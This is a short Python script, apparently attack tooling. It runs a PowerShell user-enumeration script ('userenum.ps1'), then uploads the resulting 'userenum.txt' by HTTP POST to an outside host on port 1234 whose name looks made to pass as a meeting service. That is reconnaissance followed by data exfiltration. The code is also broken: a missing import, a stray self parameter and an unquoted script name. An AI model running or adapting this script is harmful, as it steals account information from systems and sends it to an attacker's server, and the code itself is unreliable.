import requests
import os
import time

def run(self, cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed

u = "http://download.thinkbroadband.com/10MB.zip"
r = requests.get(u)

op=run(userenum.ps1)
print(op)

time.sleep(5)


url = 'http://secureonemeet.com:1234/success'
files = {'file': open('userenum.txt', 'rb')}

r = requests.post(url, files=files)
r.text
